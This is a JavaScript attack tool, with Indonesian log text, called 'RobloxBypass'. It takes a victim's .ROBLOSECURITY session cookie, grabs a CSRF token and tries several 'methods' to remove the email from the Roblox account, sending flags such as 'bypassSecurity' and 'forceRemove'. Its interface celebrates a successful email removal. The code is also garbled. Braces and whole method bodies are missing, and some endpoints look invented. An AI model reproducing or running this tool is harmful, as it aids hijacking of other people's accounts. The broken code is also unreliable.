class RobloxBypass {
    constructor(cookie, password) {
        this.cookie = cookie;
        this.password = password || 'BYPASS_13PLUS';
        this.csrf = '';
        this.userId = '';
        this.username = '';
        this.logs = [];
        this.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',

            'Origin': 'https://www.roblox.com',
            'Referer': 'https://www.roblox.com/',
            'Cookie': `.ROBLOSECURITY=${cookie}`
        };
    }

    addLog(msg, type = 'info') {
        this.logs.push({ msg, type, time: new Date().toLocaleTimeString() });
        this.updateLog();
    }

    updateLog() {
        const box = document.getElementById('logBox');
        box.innerHTML = this.logs.map(l => 
            `<div class="log-line ${l.type}">[${l.time}] ${l.msg}</div>`
        ).join('');
        box.scrollTop = box.scrollHeight;
    }

    async fetchAPI(url, options = {}) {
        try {
            const res = await fetch(url, {
                ...options,
                headers: { ...this.headers, ...options.headers }
            });
            return res;
        } catch (e) {
            throw e;
        }
    }

    async getCSRF() {
        this.addLog('🔑 Mengambil CSRF token...', 'info');
        try {
            const res = await this.fetchAPI('https://auth.roblox.com/v2/logout', { method: 'POST' });
            this.csrf = res.headers.get('x-csrf-token') || '';
            if (this.csrf) {
                this.headers['X-CSRF-TOKEN'] = this.csrf;
                this.addLog('✅ CSRF token berhasil', 'success');
                return this.csrf;
            }
            this.addLog('⚠️ CSRF token tidak ditemukan', 'info');
            return null;
        } catch (e) {
            this.addLog(`⚠️ Error CSRF: ${e.message}`, 'error');
            return null;
        }
    }

    async getUserInfo() {
        this.addLog('👤 Mengambil info akun...', 'info');
        try {
            const res = await this.fetchAPI('https://www.roblox.com/mobileapi/userinfo');
            if (res.ok) {
                const data = await res.json();
                this.userId = data.UserID;
                this.username = data.UserName;
                this.addLog(`✅ Akun: ${this.username} (ID: ${this.userId})`, 'success');
                return data;
            }
            throw new Error('Gagal ambil info');
        } catch (e) {
            this.addLog(`❌ Error: ${e.message}`, 'error');
            throw e;
        }

    async verifyPassword() {
        this.addLog('🔐 Verifikasi password...', 'info');
        try {
            const res = await this.fetchAPI('https://auth.roblox.com/v2/account/password/verify', {
                method: 'POST',
                body: JSON.stringify({
                    username: this.username,
                    password: this.password
                })
            });
            if (res.ok) {
                this.addLog('✅ Password terverifikasi', 'success');
                return true;
            }
            this.addLog('⚠️ Password tidak diverifikasi, lanjut bypass', 'info');
            return false;
        } catch (e) {
            this.addLog(`⚠️ Error verifikasi: ${e.message}`, 'error');
            return false;

                headers: { 'X-Password-Verified': 'true' },
                body: JSON.stringify({ 
                    password: this.password, 
                    action: 'remove',
                    verified: true 
                })
            });
            if (res.ok) {
                this.addLog('✅ Method 1 BERHASIL!', 'success');

            }
            const err = await res.json();

        } catch (e) {

            this.addLog('⚠️ Method 2 gagal', 'error');

        // METHOD 3: WEBHOOK
        this.addLog('📌 Method 3: WEBHOOK', 'info');
        try {
            const res = await this.fetchAPI('https://apis.roblox.com/webhook/v1/process', {
                method: 'POST',
                body: JSON.stringify({
                    userId: this.userId,
                    username: this.username,

            });
            if (res.ok) {
                this.addLog('✅ Method 3 BERHASIL!', 'success');
                return { success: true, method: 'WEBHOOK' };
            }
            this.addLog('⚠️ Method 3 gagal', 'error');
        } catch (e) {
            this.addLog(`⚠️ Method 3 error: ${e.message}`, 'error');
        }

        // METHOD 4: ALTERNATIVE ENDPOINT
        this.addLog('📌 Method 4: ALTERNATIVE', 'info');
        try {
            const res = await this.fetchAPI('https://auth.roblox.com/v2/account/email/remove', {
                method: 'POST',
                body: JSON.stringify({
                    password: this.password,
                    bypassSecurity: true,
                    forceRemove: true,
                    verified: true
                })
            });
            if (res.ok) {
                this.addLog('✅ Method 4 BERHASIL!', 'success');

            }
            this.addLog('⚠️ Method 4 gagal', 'error');
        } catch (e) {
            this.addLog(`⚠️ Method 4 error: ${e.message}`, 'error');
        }

        return { success: false };
    }

    async execute() {

            await this.getCSRF();

                    username: this.username,

                    method: result.method,

                detail: `❌ ERROR FATAL!\n\n${e.message}\n\nLogs:\n${this.logs.map(l => `[${l.time}] ${l.msg}`).join('\n')}`

}

// ===== UI CONTROLLER =====
document.getElementById('bypassBtn').addEventListener('click', async function() {
    const cookie = document.getElementById('cookieInput').value.trim();

    const resultDiv = document.getElementById('result');

    logBox.classList.remove('show');
    resultDiv.classList.remove('show', 'success', 'error');

    status.textContent = '🔄 PROCESSING...';
    status.style.color = '#ffaa00';

    const bypass = new RobloxBypass(cookie, password);
    const result = await bypass.execute();

    loader.classList.remove('show');
    btn.disabled = false;
    logBox.classList.add('show');

    if (result.success) {
        showResult('success', '✅ BYPASS SUKSES! EMAIL TERHAPUS!', result.detail);
        status.textContent = '🟢 SUCCESS - EMAIL REMOVED';
        status.style.color = '#00ff88';
    } else {
        showResult('error', '❌ BYPASS GAGAL!', result.detail);
        status.textContent = '🔴 FAILED - RETRY';
        status.style.color = '#ff0040';
    }
});

function showResult(type, msg, detail) {
    const resultDiv = document.getElementById('result');

    resultDiv.className = 'result show ' + type;

}
